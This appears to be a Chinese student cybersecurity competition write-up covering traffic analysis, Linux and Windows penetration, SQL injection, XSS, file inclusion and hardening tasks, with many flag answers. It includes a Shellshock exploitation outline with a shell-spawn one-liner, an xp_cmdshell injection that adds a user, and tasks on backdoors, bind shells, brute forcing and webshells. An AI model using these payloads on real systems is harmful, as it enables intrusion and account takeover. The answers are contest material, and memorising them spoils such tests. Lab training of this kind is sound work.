> sys.exit(0)和sys.exit(1)是有区别的 //自己去百度吧

Flag{sys.exit(0)}

继续编辑Python程序410.py，使该程序实现基于TCP全开的端口扫描，填写该文件当中空缺的flag10字符串，将该字符串作为Flag值提交。

> 这个当时看的我一脸懵逼
>
> 这个是返回来的一个对象看来看去应该也就\[resp\]//是题目中的一个变量

Flag\[resp\]

盘提交。

**任务二：Wireshark数据包分析**

**任务环境说明：**

ü 服务器场景：FTPServer220223

ü 服务器场景操作系统：未知（关闭连接）

ü FTP用户名：wireshark0051密码：wireshark0051

1. 从靶机服务器的FTP上下载wireshark0051.pcap数据包文件，找出黑客获取到的可成功登录目标服务器FTP的账号密码，并将黑客获取到的账号密码作为Flag值（用户名与密码之间以英文逗号分隔，例如：root,toor）提交；

![截图.png](    赛题环境解析/media/image70.png){width="5.760416666666667in"
height="4.209137139107612in"}

2. 继续分析数据包wireshark0051.pcap，找出黑客使用获取到的账号密码登录FTP的时间，并将黑客登录FTP的时间作为Flag值（例如：14:22:08）提交；

![截图.png](    赛题环境解析/media/image71.png){width="5.760416666666667in"
height="1.352648731408574in"}

3. 继续分析数据包wireshark0051.pcap，找出黑客连接FTP服务器时获取到的FTP服务版本号，并将获取到的FTP服务版本号作为Flag值提交；

![截图.png](    赛题环境解析/media/image70.png){width="5.760416666666667in"
height="4.209137139107612in"}

4. 继续分析数据包wireshark0051.pcap，找出黑客成功登录FTP服务器后执行的第一条命令，并将执行的命令作为Flag值提交;

ls或dir

5. 继续分析数据包wireshark0051.pcap，找出黑客成功登录FTP服务器后下载的关键文件，并将下载的文件名称作为Flag值提交；

flag123.txt

6. 继续分析数据包wirey0051.pcap，找出黑客暴力破解目标服务器Telnet服务并成功获取到的用户名与密码，并将获取到的用户名与密码作为Flag值（用户名与密码之间以英文逗号分隔，例如：root,toor）提交；

![截图.png](    赛题环境解析/media/image72.png){width="5.486111111111111in"
height="2.1965266841644793in"}

7. 继续分析数据包wireshark0051.pcap，找出黑客在服务器网站根目录下添加的文件，并将该文件的文件名称作为Flag值提交；

![截图.png](    赛题环境解析/media/image73.png){width="5.760416666666667in"
height="0.35878062117235343in"}

8. 继续分析数据包wireshark0051.pcap，找出黑客在服务器系统中添加的用户，并将添加的用户名与密码作为Flag值（用户名与密码之间以英文逗号分隔，例如：root,toor）提交。

![截图.png](    赛题环境解析/media/image74.png){width="5.760416666666667in"
height="2.0608825459317583in"}

**B-3：Linux系统渗透提权**

**任务环境说明：**

ü 服务器场景：Server2204（关闭链接）

ü 用户名：hacker        密码：123456

1.   使用渗透机对服务器信息收集，并将服务器中SSH服务端口号作为flag提交；

![截图.png](    赛题环境解析/media/image75.png){width="5.760416666666667in"
height="2.069372265966754in"}

2.   使用渗透机对服务器信息收集，并将服务器中主机名称作为flag提交；

![截图.png](    赛题环境解析/media/image76.png){width="2.611111111111111in"
height="0.3953073053368329in"}

3.   使用渗透机对服务器信息收集，并将服务器中系统内核版本作为flag提交；

![截图.png](    赛题环境解析/media/image77.png){width="2.611111111111111in"
height="0.344666447944007in"}

4.  
使用渗透机对服务器管理员提权，并将服务器中root目录下的文本内容作为flag提交；

![截图.png](    赛题环境解析/media/image78.png){width="5.760416666666667in"
height="2.533377077865267in"}

![截图.png](    赛题环境解析/media/image79.png){width="5.760416666666667in"
height="3.241829615048119in"}

![截图.png](    赛题环境解析/media/image80.png){width="5.760416666666667in"
height="4.79547353455818in"}

![截图.png](    赛题环境解析/media/image81.png){width="5.055555555555555in"
height="0.9068733595800524in"}

![截图.png](    赛题环境解析/media/image82.png){width="5.760416666666667in"
height="2.2031583552055993in"}

5.   使用渗透机对服务器管理员提权，并将服务器中root的密码作为flag提交；

6.  
使用渗透机对服务器管理员提权，并将服务器中root目录下的图片内容作为flag提交。

![截图.png](    赛题环境解析/media/image83.png){width="5.760416666666667in"
height="3.368970909886264in"}

**B-2：Linux操作系统渗透测试(破壳)**

**任务环境说明：**

ü 服务器场景：Server18-2=19-JY-Linux（关闭链接）

ü 服务器场景操作系统：Linux（版本不详）

1.  
通过本地PC中渗透测试平台Kali对服务器场景Linux进行系统服务及版本扫描渗透测试，并将该操作显示结果中MySQL数据库对应的服务版本信息字符串作为FLAG提交；

Flag{5.1.73-log}

2.  
通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/var/www/html目录中唯一一个后缀为.html文件的文件名称作为FLAG提交；

Flag(loginmanager.html}

3.  
通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/var/www/html目录中唯一一个后缀为.html文件的文件内容作为FLAG提交；

Flag{slkrvung}

4.  
通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/root目录中唯一一个后缀为.bmp文件的文件名称作为FLAG提交；

不用提权直接进root查看即可

5.  
通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/root目录中唯一一个后缀为.bmp的图片文件中的英文单词作为FLAG提交。

把图片拷贝到web目录下访问即可

渗透思路：

首先扫描看到常见的22 80 443端口

还有一个不常见的47560端口（以为是后门漏洞）但是尝试后发现连不上

于是只好把目标放在80端口（web渗透）于是dirb进行扫描

看到他了 瞬间有底气了有思路了（立马想到cve破壳漏洞）

Search cve-2014-6271

参数设置一下

Rhosts lhost paylaod

targeturi（这个就是上面扫到的那个目录）

然后攻进去之后就python -c 'import pty;pty.spawn("/bin/bash")'

**B-6：流量分析**

**任务环境说明：**

ü  服务器场景：Server09

ü  服务器场景操作系统：未知（关闭连接）

ü  系统用户名：administrator密码：123456

1.  
使用Wireshark查看并分析靶机桌面下的capture.pcapng数据包文件，找到黑客的IP地址，并将黑客的IP地址作为Flag值（如：172.16.1.1）提交；

![截图.png](    赛题环境解析/media/image84.png){width="5.760416666666667in"
height="0.23137357830271216in"}

2.  
继续分析capture.pcapng数据包文件，找出黑客通过工具对目标服务器的哪些服务进行了密码暴力枚举渗透测试，将服务对应的端口依照从小到大的顺序依次排列作为Flag值（如：77/88/99/166/1888）提交；

21,22,23,80,3306

3.  
继续分析capture.pcapng数据包文件，找出黑客已经获取到目标服务器的基本信息，请将黑客获取到的目标服务器主机名作为Flag值提交；

![截图.png](    赛题环境解析/media/image85.png){width="2.763888888888889in"
height="0.2920330271216098in"}

4.  
继续分析capture.pcapng数据包文件，找出黑客成功破解了哪个服务的密码，并将该服务的版本号作为Flag值(如：5.1.10)提交；

![截图.png](    赛题环境解析/media/image86.png){width="3.388888888888889in"
height="1.491111111111111in"}

5.  
继续分析capture.pcapng数据包文件，黑客通过数据库写入了木马,将写入的木马名称作为Flag值提交（名称不包含后缀）；

![截图.png](    赛题环境解析/media/image87.png){width="5.760416666666667in"
height="0.3600262467191601in"}

6.  
继续分析capture.pcapng数据包文件，黑客通过数据库写入了木马,将黑客写入的一句话木马的连接密码作为Flag值提交；

![截图.png](    赛题环境解析/media/image87.png){width="5.760416666666667in"
height="0.3600262467191601in"}

7.  
继续分析capture.pcapng数据包文件，找出黑客连接一句话木马后查看了什么文件，将黑客查看的文件名称作为Flag值提交；

passwd

![截图.png](    赛题环境解析/media/image88.png){width="5.569444444444445in"
height="4.109290244969379in"}

8.  
继续分析capture.pcapng数据包文件，黑客可能找到异常用户后再次对目标服务器的某个服务进行了密码暴力枚举渗透，成功破解出服务的密码后登录到服务器中下载了一张图片，将图片文件中的英文单词作为Flag值提交。

![截图.png](    赛题环境解析/media/image89.png){width="5.760416666666667in"
height="3.7453258967629046in"}

**任务五：Linux操作系统渗透测试**

**任务环境说明：(笑脸漏洞)**

ü  服务器场景：PYsystem0040

ü  服务器场景操作系统：未知

ü  服务器场景用户名:未知 密码：未知

1\.
通过渗透机Kali对靶机服务器进行系统服务及版本扫描渗透测试，并将该操作显示结果中21端口对应的服务版本信息字符串作为Flag值提交；（1分）

2\. Flag:vsftpd 2.3.4

![截图.png](    赛题环境解析/media/image90.png){width="5.760416666666667in"
height="2.828692038495188in"}

3\.
通过渗透机Kali对靶机服务器进行渗透测试，将该场景/var/www目录中唯一一个后缀为.bmp文件的文件名称作为Flag值提交；（1分）

![截图.png](    赛题环境解析/media/image91.png){width="5.760416666666667in"
height="3.2308770778652667in"}

4\. Flag:1097c4f5d.bmp

5\.
通过渗透机Kali对靶机服务器进行渗透测试，将该场景/var/www目录中唯一一个后缀为.bmp的图片文件中的英文单词作为Flag值提交；（1分）

6\. Very good

7\.
通过渗透机Kali对靶机服务器进行渗透测试，将该场景/home/guest目录中唯一一个后缀为.pdf文件的文件名称作为Flag值提交；（1分）

8\. 499c1097c4f5d.pdf

![截图.png](    赛题环境解析/media/image92.png){width="2.2916666666666665in"
height="0.6354166666666666in"}

9\.
通过渗透机Kali对靶机服务器进行渗透测试，将该场景/home/guest目录中唯一一个后缀为.pdf文件的文件内容作为Flag值提交；（2分）

  flag:157eb9ce33644ada6d0499c1097c45d通过渗透机Kali对靶机服务器进行渗透测试，将该场景/var/vsftpd目录中唯一一个后缀为.docx文件的文件名称作为Flag值提交；（1分）  358dc0044.docx    

![截图.png](    赛题环境解析/media/image93.png){width="4.694444444444445in"
height="1.3561734470691165in"}

通过渗透机Kali对靶机服务器进行渗透测试，将该场景/var/vsftpd目录中唯一一个后缀为.docx文件的文件内容作为Flag值提交；（2分）

59b466fd93164953e56bdd1358dc0044  通过渗透机Kali对靶机服务器进行渗透测试，将该场景/root目录中唯一一个后缀为.txt文件的文件名称作为Flag值提交；（1分93e8a5f7a.txt通过渗透机Kali对靶机服务器进行渗透测试，将该场景/root目录中唯一一个后缀为.txt文件的文件内容作为Flag值提交。（2分2bbfa55dc58149cbdc795d293e8a5f7a

**任务四：Web安全渗透测试 **

**任务环境说明：**

ü 服务器场景：PYsystem0043

ü 服务器场景操作系统：未知

ü 服务器场景用户名:未知 密码：未知

1.通过浏览器访问http://靶机服务器IP/1，对该页面进行渗透测试,
找到flag格式：flag｛Xxxx123｝，括号中的内容作为flag值并提交；（2分）(截图)

![截图.png](    赛题环境解析/media/image94.png){width="5.760416666666667in"
height="1.0132786526684165in"}

2.通过浏览器访问http://靶机服务器IP/2，对该页面进行渗透测试,
找到flag格式：flag｛Xxxx123｝，括号中的内容作为flag值并提交；（2分）

![截图.png](    赛题环境解析/media/image95.png){width="5.760416666666667in"
height="1.5803740157480315in"}

![截图.png](    赛题环境解析/media/image96.png){width="5.402777777777778in"
height="1.8461231408573928in"}

3.通过浏览器访问http://靶机服务器IP/3，对该页面进行渗透测试,
找到flag格式：flag｛Xxxx123｝，括号中的内容作为flag值并提交；（2分）

![截图.png](    赛题环境解析/media/image97.png){width="5.760416666666667in"
height="2.898277559055118in"}

![截图.png](    赛题环境解析/media/image98.png){width="5.760416666666667in"
height="2.8429647856517937in"}

4.通过浏览器访问http://靶机服务器IP/4，对该页面进行渗透测试,
找到flag格式：flag｛Xxxx123｝，括号中的内容作为flag值并提交；（3分）

![截图.png](    赛题环境解析/media/image99.png){width="5.760416666666667in"
height="5.346817585301837in"}

![截图.png](    赛题环境解析/media/image100.png){width="5.760416666666667in"
height="3.1243700787401574in"}

5.通过浏览器访问http://靶机服务器IP/5，对该页面进行渗透测试,
找到flag格式：flag｛Xxxx123｝，括号中的内容作为flag值并提交。（3分）搜索flag

![截图.png](    赛题环境解析/media/image101.png){width="5.760416666666667in"
height="1.8730194663167103in"}

**B-4：SQL注入测试（shopxp）**

**任务环境说明：**

ü  服务器场景：Server12

ü  服务器场景操作系统：未知（关闭链接）

1.  
已知靶机存在网站系统，使用Nmap工具扫描靶机端口，并将网站服务的端口号作为Flag（形式：Flag字符串）值提交。

2.  
访问网站/admin/pinglun.asp页面，此页面存在SQL注入漏洞，使用排序语句进行列数猜测，将语句作为Flag（形式：URL无空格）值提交。

3.  
页面没有返回任何有用信息，尝试使用联合查询进行SQL注入，构建基本查询语句进行SQL注入，将语句作为Flag（形式：语句无空格）值提交。

4.  
使用联合查询进行列数猜测，构建常规的联合查询列数猜测语句，将出现在文本框里4个字段的序号作为Flag值（形式：F1.F2.F3.F4）提交。

5.  
构建注入语句，查询数据库中管理员的敏感信息，将获取到密码信息作为Flag值（形式：Flag字符串）提交。

**Linux系统安全加固**

任务环境说明：

ü 服务器场景：CentOS5.5

ü 服务器场景操作系统：CentOS5.5

1.通过PC2中渗透测试平台对服务器场景CentOS5.5进行服务扫描渗透测试，并将扫描结果上数第5行的4个单词作为Flag（形式：单词1\|单词2\|单词3\|单词4）提交；

![截图.png](    赛题环境解析/media/image102.png){width="5.760416666666667in"
height="2.401400918635171in"}

2.通过PC2中渗透测试平台对服务器场景CentOS5.5进行远程超级管理员口令暴力破解（使用PC2中的渗透测试平台中的字典文件superdic.txt），并将破解结果Success：后面2个空格之间的字符串作为Flag提交；

3.通过PC2中渗透测试平台打开已经建立的会话，在与CentOS5.5的会话中新建用户admin，并将该用户提权至root权限，并将新建用户admin并提权至root权限全部命令作为Flag（形式：命令1\|命令2\|...\|命令n）提交；

4.修改并在原目录下编译、运行./root/autorunp.c木马程序，使该木马程序能够实现远程连接 8080端口，并在该端口上运行/bin/sh命令行程序，并将运行./root/autorunp.c木马程序以及运行后的系统网络连接状态（netstat
-an）增加行内容作为Flag提交；

5.将autorunp.c木马程序设置为系统启动后自动加载，并转入系统后台运行，并将在配置文件中增加的内容作为Flag提交；

6.重新启动CentOS5.5服务器场景，通过PC2中渗透测试平台NETCAT远程打开CentOS5.5服务器场景./bin/sh程序，并运行查看IP地址命令，并将运行该命令需要输入的字符串作为Flag提交；

7.对CentOS5.5服务器场景进行安全加固，阻止PC2中渗透测试平台对服务器场景CentOS5.5进行远程超级管理员口令暴力破解，并将配置文件增加的内容字符串作为Flag提交；

服务漏洞扫描于测试

B-3：隐写术应用

任务环境说明：

服务器场景：Server23

服务器场景操作系统：Windows（开放链接）

用户名:administrator密码：123456

1.找到桌面文件夹1中的文件，将文件中的隐藏信息作为flag值提交；

2.找到桌面文件夹2中的文件，将文件中的隐藏信息作为flag值提交；

3.找到桌面文件夹3中的文件，将文件中的隐藏信息作为flag值提交；

4.找到桌面文件夹4中的文件，将文件中的隐藏信息作为flag值提交；

5.找到桌面文件夹5中的文件，将文件中的隐藏信息作为flag值提交。

**B-2：跨站脚本渗透**

**任务环境说明：**

ü  服务器场景：Server2125（关闭链接）

ü  服务器场景操作系统：未知

ü  用户名:未知 密码：未知

1.  访问服务器网站目录1，根据页面信息完成条件，将获取到弹框信息作为flag提交；

2.  访问服务器网站目录2，根据页面信息完成条件，将获取到弹框信息作为flag提交；

3.  访问服务器网站目录3，根据页面信息完成条件，将获取到弹框信息作为flag提交；

4.  访问服务器网站目录4，根据页面信息完成条件，将获取到弹框信息作为flag提交；

5.  访问服务器网站目录5，根据页面信息完成条件，将获取到弹框信息作为flag提交；

6.  访问服务器网站目录6，根据页面信息完成条件，将获取到弹框信息作为flag提交；

**B-3：文件分析破解**

**任务环境说明：**

ü  服务器场景名：Server2005（关闭链接）

ü  服务器场景用户名:rartest

1.  通过本地PC中渗透测试平台Kali使用Nmap扫描目标靶机服务版本信息，将Telnet版本信息字符串作为Flag提交；

2.  通过本地PC中渗透测试平台Kali对服务器场景Windows进行渗透测试，使用kali中hydra对服务器Telnet服务进行暴力破解（用户名为rartest），找到加密后的压缩包文件，将加密压缩包的文件名作为Flag提交；；（字典路径/usr/share/wordlists/dirb/small.txt）

3.  通过本地PC中渗透测试平台Kali下载目标靶机加密压缩包文件以及字典文件dict.txt，将压缩包内唯一一个文件的文件名作为Flag提交；

4.  通过本地PC中渗透测试平台Kali利用靶机上dict.txt字典文件破解加密压缩包文件，将压缩包的解压密码作为Flag提交；

5.  通过本地PC中渗透测试平台Kali打开加密压缩包解压后的唯一一个文件，将文件中的Flag提交；

**B-4：数字取证调查**

**任务环境说明：**

ü  服务器场景：FTPServer20221010（关闭链接）

ü  服务器场景操作系统：未知

ü  FTP用户名:attack817密码：attack817

1.  分析attack.pcapng数据包文件，通过分析数据包attack.pcapng找出恶意用户第一次访问HTTP服务的数据包是第几号，将该号数作为Flag值提交；

2.  继续查看数据包文件attack.pcapng，分析出恶意用户扫描了哪些端口，将全部的端口号从小到大作为Flag值（形式：端口1,端口2,端口3...,端口n）提交；

3.  继续查看数据包文件attack.pcapng分析出恶意用户登录后台所用的密码是什么，将后台密码作为Flag值提交；

4.  继续查看数据包文件attack.pcapng分析出恶意用户写入的一句话木马的密码是什么，将一句话密码作为Flag值提交；

5.  继续查看数据包文件attack.pcapng分析出恶意用户下载了什么文件，将该文件内容作为Flag值提交。

**B-5：事件分析应急响应**

**任务环境说明：**

ü  服务器场景：Server2229（开放链接）

ü  用户名：root，密码：p@ssw0rd123

1.  找出黑客植入到系统中的二进制木马程序，并将木马程序的名称作为Flag值（若存在多个提交时使用英文逗号隔开，例如bin,sbin,\...）提交；

2.  找出被黑客修改的系统默认指令，并将被修改的指令里最后一个单词作为Flag值提交；

3.  找出被黑客替换的系统指令，并将其绝对路径作为Flag值提交；

4.  找出被黑客修改的服务配置文件，将文件的md5值前四位作为Flag值提交；

5.  找出系统中的弱口令账号，将该账号的用户名及密码作为Flag值(用户名和密码之间用英文冒号隔开，例如：root:toor)提交。

**B-6：Web应用程序文件包含**

**任务环境说明：**

ü  服务器场景名称：Server2233（关闭链接）

1.  通过扫描Web服务器并访问其网站内容，在首页中找到隐藏在源码中的flag并提交；

2.  访问Server2233服务器场景并通过万能用户名、任意密码登录，分析登陆后列表页面（list.html）的源代码，找到源代码中隐藏的flag并提交；

3.  进入Server2233服务器场景\"/\"-\>\"DisplayUploaded\'s File
Content\"，输入字符查看上级目录中的flag.txt文件内容。并将包含点变量名(flag1)及flag文件内容(flag2)作为flag提交。（提交格式：flag1_flag2）

4.  对页面注入点进行渗透测试，通过php://filter协议使当前页面以大写明文方式回显Server2233服务器场景C盘根目录flag.php内容，并将注入语句作为Flag提交

5.  利用远程文件包含向服务器写入名为admini.php密码为test的一句话木马，将包含时的文件内容作为flag提交

6.  使用win7中一句话木马连接工具（菜刀），连接上题中生成的一句话木马。下载服务器中的ftp文件夹中的压缩包。将压缩包中的flag.txt内容提交。

**B-1：Linux系统渗透提权**

**任务环境说明：**

ü  服务器场景：Server2213（关闭链接）

ü  用户名：hacker        密码：123456

1.  使用渗透机对服务器信息收集，并将服务器中SSH服务端口号作为flag提交；

2.  使用渗透机对服务器信息收集，并将服务器中主机名称作为flag提交；

3.  使用渗透机对服务器信息收集，并将服务器中系统内核版本作为flag提交；

4.  使用渗透机对服务器管理员提权，并将服务器中root目录下的文本内容作为flag提交；

5.  使用渗透机对服务器管理员提权，并将服务器中root的密码作为flag提交；

6.  使用渗透机对服务器管理员提权，并将服务器中root目录下的图片内容作为flag提交。

B-4：Windows操作系统渗透测试

任务环境说明：

服务器场景：Server24

服务器场景操作系统：Windows（版本不详）（封闭靶机）

1.通过本地PC中渗透测试平台Kali对服务器场景Server08进行系统服务及版本扫描渗透测试，并将该操作显示结果中1433端口对应的服务版本信息作为Flag值提交（例如3.1.4500）；

2.通过本地PC中渗透测试平台Kali对服务器场景Server08进行系统服务及版本扫描渗透测试，将DNS服务器的主机完全合格域名作为Flag值提交；

3.将目标服务器中SQL-Server数据库低权限（无法通过数据库执行指令系统命令）用户的密码作为Flag值提交；

4.将目标服务器中SQL-Server数据库权限较高（可以通过数据库指令执行系统命令）用户的密码作为Flag值提交；

5.找到C:\\Windows\\system32文件夹中266437文件夹中后缀为.docx的文件，将文档内容作为Flag值提交；

**任务一：Windows 操作系统渗透测试
(**exploit/windows/http/easyfilesharing_seh漏洞**)**

**任务环境说明：**

ü 服务器场景：Windows2020

ü 服务器场景操作系统：Windows（版本不详）

1\. 通过本地 PC 中渗透测试平台 Kali2.0 对服务器场景 Windows2020
进行系统服务及版

本扫描渗透测试，并将该操作显示结果中 8080
端口对应的服务版本信息字符串作为

Flag 值提交；

![截图.png](    赛题环境解析/media/image103.png){width="5.760416666666667in"
height="3.3353805774278213in"}

2\. 通过本地 PC 中渗透测试平台 Kali2.0 对服务器场景 Windows2020
进行渗透测试，将

该场景网络连接信息中的 DNS 信息作为 Flag 值 (例如：114.114.114.114)
提交；

![截图.png](    赛题环境解析/media/image104.png){width="5.760416666666667in"
height="1.774711286089239in"}

getsystem提权成功

![截图.png](    赛题环境解析/media/image105.png){width="3.5972222222222223in"
height="0.6256036745406824in"}

![截图.png](    赛题环境解析/media/image106.png){width="5.760416666666667in"
height="3.5541393263342083in"}

3\. 通过本地 PC 中渗透测试平台 Kali2.0 对服务器场景 Windows2020
进行渗透测试，将

该场景中的当前最高账户管理员的密码作为 Flag 值提交；

![截图.png](    赛题环境解析/media/image107.png){width="5.527777777777778in"
height="3.7547167541557305in"}

4\. 通过本地 PC 中渗透测试平台 Kali2.0 对服务器场景 Windows2020
进行渗透测试，将

该场景桌面上 111 文件夹中唯一一个后缀为.docx 文件的文件名称作为 Flag
值提交；

![截图.png](    赛题环境解析/media/image108.png){width="5.760416666666667in"
height="1.5563560804899388in"}

5\. 通过本地 PC 中渗透测试平台 Kali2.0 对v服务器场景 Windows2020
进行渗透测试，将

该场景桌面上 111 文件夹中唯一一个后缀为.docx 文件的文档内容作为 Flag
值提交；

![截图.png](    赛题环境解析/media/image109.png){width="5.760416666666667in"
height="2.326130796150481in"}

 

6\. 通过本地 PC 中渗透测试平台 Kali2.0 对服务器场景 Windows2020
进行渗透测试，将

该场景桌面上 222 文件夹中唯一一个图片中的英文单词作为 Flag 值提交；

![截图.png](    赛题环境解析/media/image110.png){width="0.9305555555555556in"
height="0.7737204724409449in"}

7\. 通过本地 PC 中渗透测试平台 Kali2.0 对服务器场景 Windows2020
进行渗透测试，将

该场景中回收站内文件的文档内容作为 Flag 值提交。

![截图.png](    赛题环境解析/media/image111.png){width="5.760416666666667in"
height="3.2175306211723536in"}

![截图.png](    赛题环境解析/media/image112.png){width="4.486111111111111in"
height="2.0088615485564305in"}

**二层网络Sniffer监听安全攻防**

**任务环境说明：**

服务器场景：WebServ2003（用户名：administrator；密码：空）

服务器场景操作系统：Microsoft Windows2003 Server

服务器场景安装服务/工具1：Apache2.2；

服务器场景安装服务/工具2：Php6；

服务器场景安装服务/工具3：Microsoft SqlServer2000；

服务器场景安装服务/工具4：EditPlus；

1.PC2（虚拟机：Backtrack5）打开Wireshark，监听到PC2（虚拟机：WindowsXP）通过Internet
Explorer访问服务器场景的HTTP请求数据包，通过对该数据包的分析，确定该数据包中含有PC2（虚拟机：WindowsXP）通过Internet
Explorer访问服务器场景的用户名、密码，并将存放用户名的变量名和存放密码的变量名作为Flag（形式：存放用户名的变量名&存放密码的变量名）提交；

![截图.png](    赛题环境解析/media/image113.png){width="5.760416666666667in"
height="2.7496194225721786in"}

2.在PC2（虚拟机：WindowsXP）和DCST中的WebServ2003服务器场景之间建立IPSec
VPN，阻止Sniffer监听渗透测试，PC2（虚拟机：WindowsXP）通过Ping访问WebServ2003服务器，将第1个数据包的回显结果作为Flag提交；

3.PC2（虚拟机：Backtrack5）再次打开Wireshark，监听PC2（虚拟机：WindowsXP）访问WebServ2003服务器场景HTTP流量，验证此时PC2（虚拟机：Backtrack5）Wireshark中无法明文显示PC2（虚拟机：WindowsXP）访问WebServ2003服务器场景的HTTP流量，并将Wireshark中显示该流量Protocol名称作为Flag提交。

505

**任务二: Web应用程序SQL Inject安全攻防**

**任务环境说明：**

ü 服务器场景：WebServ2003（用户名：administrator；密码：空）

ü 服务器场景操作系统：Microsoft Windows2003 Server

ü 服务器场景安装服务/工具1：Apache2.2；

ü 服务器场景安装服务/工具2：Php6；

ü 服务器场景安装服务/工具3：Microsoft SqlServer2000；

ü 服务器场景安装服务/工具4：EditPlus；

1. 进入WebServ2003服务器场景，分析源文件login.php，找到提交的变量名，并将全部的变量名作为Flag（形式：\[变量名1&变量名2&变量名3...&变量名n\]）提交；

![截图.png](    赛题环境解析/media/image113.png){width="5.760416666666667in"
height="2.7496194225721786in"}

2.通过万能用户名、任意密码登录进入WebServ2003服务器场景，\"/\"-\>\"Employee
Information
Query\"，查看该页面源文件，找到提交的变量名，并将全部的变量名作为Flag（形式：\[变量名1&变量名2&变量名3...&变量名n\]）提交；

![截图.png](    赛题环境解析/media/image114.png){width="5.760416666666667in"
height="1.4630675853018373in"}

![截图.png](    赛题环境解析/media/image115.png){width="5.760416666666667in"
height="4.256778215223097in"}

3. 通过对任务第2题页面注入点"\_"进行SQL注入渗透测试，在WebServ2003服务器场景中添加账号"Hacker"，密码"P@ssword"，并将注入语句作为Flag提交；

Flag:[\' exec master.dbo.xp_cmdshell \'net user Hacker P@ssword /add\'
\--]{.mark}

4. 进入WebServ2003服务器场景的C:\\AppServ\\www目录，找到QueryCtrl.php程序，使用EditPlus工具分析并修改PHP源文件，使之可以抵御SQL注入渗透测试，并将修改后的PHP源文件中的F1和F2作为Flag（形式：\[F1\]+\[F2\]）提交;

Flag:[ ]{.mark}

![截图.png](    赛题环境解析/media/image116.png){width="5.760416666666667in"
height="3.7291786964129483in"}

5. 再次对该任务第2题页面注入点进行渗透测试，验证此次利用注入点对该WebServ2003服务器场景进行SQL注入渗透测试无效，并将测试后页面回显倒数第2行作为Flag提交。

![截图.png](    赛题环境解析/media/image117.png){width="5.760416666666667in"
height="4.203158355205599in"}

数据库安全加固(使用exploit/windows/smb/ms17-010-pesexec)

任务环境说明：-0

ü 服务器场景名称：WebServ2003

ü 服务器场景安全操作系统：Microsoft Windows2003 Server

ü 服务器场景安装中间件：Apache2.2；

ü 服务器场景安装Web开发环境：Php6；

ü 服务器场景安装数据库：Microsoft SqlServer2000；

ü 服务器场景安装文本编辑器：EditPlus；

1. 对服务器场景WebServ2003安装补丁，使其中的数据库Microsoft
SqlServer2000能够支持远程连接，并将补丁包程序所在目录名称作为Flag提交；

![截图.png](    赛题环境解析/media/image118.png){width="5.760416666666667in"
height="2.93839457567804in"}

2. 对服务器场景WebServ2003安装补丁，使其中的数据库Microsoft
SqlServer2000能够支持远程连接，在安装补丁后的服务器场景中运行netstat--an命令，将回显的数据库服务连接状态作为Flag提交；

3. 通过PC2中的渗透测试平台对服务器场景WebServ2003进行数据库服务扫描渗透测试，并将扫描结果作为Flag提交；

4. 通过PC2中的渗透测试平台对服务器场景WebServ2003进行数据库服务超级管理员口令暴力破解（使用PC2中的渗透测试平台中的字典文件superdic.txt），并将破解结果中的最后一个字符串作为Flag提交；

5. 通过PC2中de1渗透测试平台对服务器场景WebServ2003进行数据库服务扩展存储过程进行利用，删除WebServ2003服务器场景C:\\1.txt，并将渗透测试利用命令以及渗透测试平台run结果第1行回显作为Flag提交；

6. 通过对服务器场景WebServ2003的数据库服务进行安全加固，阻止PC2中渗透测试平台对其进行数据库超级管理员密码暴力破解渗透测试，并将加固身份验证选项中的最后一个字符串作为Flag提交：

7. 验证在WebServ2003的数据库服务进行安全加固后，再次通过PC2中渗透测试平台对服务器场景WebServ2003进行数据库服务超级管理员口令进行暴力破解（使用PC2中的渗透测试平台中的字典文件superdic.txt），并将破解结果的从上向下数第3行内容作为Flag提交；

**利用python脚本进行web渗透测试**

**任务环境说明：**

ü 服务器场景名称 python08

ü 服务器场景操作系统：Microsoft Windows2008 Server

ü 服务器场景用户名：administrator；密码：未知

1. 使用渗透机场景kali中工具扫描确定Web服务器场景地址，浏览网站flag.html页面，并将flag.html中的flag提交；

2. 进入服务器场景python2008，对网站的tupian.php进行编辑，使tupian.php中的每个图片都是一个单独的链接（单独访问），并将修改部分作为flag提交；

3. 进入渗透机场景win7操作系统，完善桌面上的tupian.py文件，填写该文件当中空缺的FLAG1字符串，并将该字符串作为flag提交；

4. 进入渗透机场景win7操作系统，完善桌面上的tupian.py文件，填写该文件当中空缺的FLAG2字符串，并将该字符串作为flag提交；

5. 进入渗透机场景win7操作系统，完善桌面上的tupian.py文件，填写该文件当中空缺的FLAG3字符串，并将该字符串作为flag提交；

      

6. 进入渗透机场景win7操作系统,完善桌面上的tupian.py文件，填写该文件当中空缺的FLAG字符串并运行成功文件会自动爬取网站tupian.php的图片，将爬取的图片数量作为flag提交；

Windows操作系统渗透测试（100分）

**任务环境说明：**

ü 服务器场景：PYsystemWH5

ü 服务器场景操作系统：Windows（版本不详）

用某个靶机里面的tools文件里面的双脉冲星进行渗透测试（使用windows/smb/ms17-010_psexec也可以做得）

![截图.png](    赛题环境解析/media/image119.png){width="5.760416666666667in"
height="3.357253937007874in"}

1.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystemWH5进行系统服务及版本扫描渗透测试，并将该操作显示结果中445端口对应的服务版本信息字符串作为Flag值提交；（7分）

![截图.png](    赛题环境解析/media/image120.png){width="5.760416666666667in"
height="2.808203193350831in"}

2.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystemWH5进行渗透测试，将该场景网络连接信息中的DNS信息作为Flag值
(例如：114.114.114.114) 提交；（9分）

![截图.png](    赛题环境解析/media/image121.png){width="5.760416666666667in"
height="4.3113123359580054in"}

3.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystemWH5进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文件名称作为Flag值提交；（11分）

![截图.png](    赛题环境解析/media/image122.png){width="5.760416666666667in"
height="1.4666393263342081in"}

4.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystemWH5进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文档内容作为Flag值提交；（15分）

5.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystemWH5进行渗透测试，将该场景桌面上222文件夹中唯一一个图片中的英文单词作为Flag值提交；（17分）.

![截图.png](    赛题环境解析/media/image123.png){width="4.111111111111111in"
height="3.1094192913385825in"}

6.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystemWH5进行渗透测试，将该场景中的当前最高账户管理员的密码作为Flag值提交；（20分）

